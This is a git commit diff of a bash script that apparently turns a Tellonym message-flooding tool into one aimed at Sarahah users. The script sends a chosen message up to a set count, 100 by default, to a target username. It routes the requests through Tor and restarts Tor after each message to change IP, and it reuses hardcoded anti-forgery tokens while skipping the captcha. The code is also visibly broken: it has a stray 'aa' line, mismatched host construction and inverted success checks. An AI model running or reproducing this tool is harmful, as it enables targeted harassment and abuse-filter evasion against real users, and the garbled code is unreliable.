4ff3192258df926421efe88dae7004dce3d9ff2f
David <gerhkindidnothingwrong@gmail.com>
2019-03-23 00:08:34 +0000

    Add files via upload

--- sayflood.sh
+++ sayflood.sh
@@ -1,19 +1,17 @@
 #!/bin/bash
-# SayFlood v1.2
-# Author: https://github.com/thelinuxchoice/sayflood
+# Sarahaha v1.0
+# Author: @thelinuxchoice
+# https://github.com/thelinuxchoice/sarahaha
 
 banner() {
 
+printf " \e[1;77m  ____                  _           _            \n"
+printf "  / ___|  __ _ _ __ __ _| |__   __ _| |__   __ _  \n"
+printf "  \___ \ / _\` | '__/ _\` | '_ \ / _\` | '_ \ / _\` | \n"
+printf "   ___) | (_| | | | (_| | | | | (_| | | | | (_| | \n"
+printf "  |____/ \__,_|_|  \__,_|_| |_|\__,_|_| |_|\__,_| v1.0\e[0m\n"
+printf "   \e[1;77mFlood Tool, \e[0m\e[1;92mAuthor: @thelinuxchoice\e[0m\n"
 printf "\n"                                                
-printf "\e[1;77m  ____              _____ _                 _  \n"
-printf " / ___|  __ _ _   _|  ___| | ___   ___   __| | \n"
-printf " \___ \ / _\` | | | | |_  | |/ _ \ / _ \ / _\` | \n"
-printf "  ___) | (_| | |_| |  _| | | (_) | (_) | (_| | \n"
-printf " |____/ \__,_|\__, |_|   |_|\___/ \___/ \__,_|v1.1 \n"
-printf "              |___/\e[0m                            \n"
-printf "\e[1;92m  Author: github.com/thelinuxchoice/sayflood\e[0m\n"
-printf "\e[1;77m  @linux_choice\n\e[0m"
-printf "\n"
 }
 
 checktor() {
@@ -30,45 +28,48 @@ fi
 
 start() {
 
-read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] tellonym.me Username: ' username
-checkuser=$(curl -s -i https://tellonym.me/$username -L | grep -o 'The selected page was not found')
+read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Sarahah Username: ' username
+checkuser=$(curl -s -i https://$usernametellonym.me -L | grep -o 'User Not Found')
 
-if [[ $checkuser == *'The selected page was not found'* ]]; then
+if [[ $checkuser == *'User Not Found'* ]]; then
 printf "\e[1;93m[!] User Not Found, try again!\e[0m\n"
 sleep 1
 start
 fi
-
+aa
 IFS=$'\n'
 default_amount="100"
 default_message="sorry the flood"
-read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Message: ' message
+read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Message (+7 chars): ' message
 message="${message:-${default_message}}"
 read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Amount message (Default: 100): ' amount
 amount="${amount:-${default_amount}}"
+curl --socks5-hostname localhost:9050 -i -s -L -H $"Host: "$username"tellonym.me" -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $"Referer: https://"$username"tellonym.me/" $""$username"tellonym.me" > temp_user
+#cookie=$(grep 'Set-Cookie:' temp_user | cut -d ';' -f1)
+cookie=".AspNetCore.Antiforgery.w5W7x28NAIs=CfDJ8JbdOS7FMYdKkkQ4WK5l2yYa-z-QV1MC7MMeezF2zKu3wXHmB-Lpj6G4qvmMZKwA6my5GRHvU-wLy3ekicCYiIeSb_65eEv6eSM5jVfo_Oa5gcYVwbsmC9yHSjXcdyhXxz4i9zmbEtdNDT8dTYG-COc"
+#token=$(grep "__RequestVerificationToken: '" temp_user | cut -d "'" -f2)
+
+token="CfDJ8JbdOS7FMYdKkkQ4WK5l2yabopKbjNNOAiv2FAyjF-mKyXDBY_9RI_umq1l66dMu6v-YecKKFZj3FjZcJrxN5kNic541MFN1Bgf_T_ccCC2CAc_-w7ydSBLBXaofT2Clh06lFr5kAhLJ0EajBmDzAJc"
+userid=$(grep -a "reportedUserId:" temp_user | cut -d "'" -f2)
+
 
 for i in $(seq 1 $amount); do
- 
+
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Sending message:\e[0m\e[1;93m %s\e[0m\e[1;77m/\e[0m\e[1;93m%s ...\e[0m" $i $amount
 IFS=$'\n'
-curl -i -L -s -c cookies.txt $'https://tellonym.me/'$username'' > /dev/null 2>&1
-csam=$(grep  -o 'csam.*' cookies.txt | awk {'print $2'})
+send=$(curl --socks5 localhost:9050 -i -s -k  -X $'POST'     -H $"Host: "$username"tellonym.me" -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $"Referer: https://"$username"tellonym.me/" -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'X-Requested-With: XMLHttpRequest' -H $'Content-Length: 256' -H "Cookie: "$cookie"; mnet_session_depth=1%7C1534551935648; session_depth=testingpurposestellonym.me%3D1%7C355476528%3D1" -H $'Connection: close'     -b ""$cookie"; mnet_session_depth=1%7C1534551935648; session_depth=testingpurposestellonym.me%3D1%7C355476528%3D1"     --data-binary "__RequestVerificationToken="$token"&userId="$userid"&text="$message"&captchaResponse="     $"https://"$username"tellonym.me/Messages/SendMessage" | grep 'HTTP/1.1 200'; echo $?)
 
-send=$(curl  -b cookies.txt -i -s -k  -X $'POST'     -H $'Host: tellonym.me' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: https://tellonym.me/'$username''  -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Content-Type: application/x-www-form-urlencoded'        --data-binary $'write='$message'&gif=&giphy=&more_feedback_input=&foo=C8MQzISSm05kdk8&bar=IGMYbXFaaXNzTRAVS0RLGA%3D%3D&url=&password=&password_confirm=&signup=0&url_login=&password_login=&login=0&csam='$csam''     $'https://tellonym.me/'$username'' | grep -a 'HTTP/2 200' ;)
-
-if [[ $send == *'HTTP/2 200'* ]]; then
-printf "\e[1;92m Done\n\e[0m"
-
-else
+if [[ $send == "1" ]]; then
 printf "\e[1;93m Fail\n\e[0m"
+else
+printf "\e[1;92m Done\n\e[0m"
 fi
-#killall -HUP tor > /dev/null 2>&1
-#sleep 1
+killall -HUP tor
+sleep 1
 done
-
+rm -rf temp_user
 exit 1
 }
 banner
-#checktor
+checktor
 start
-
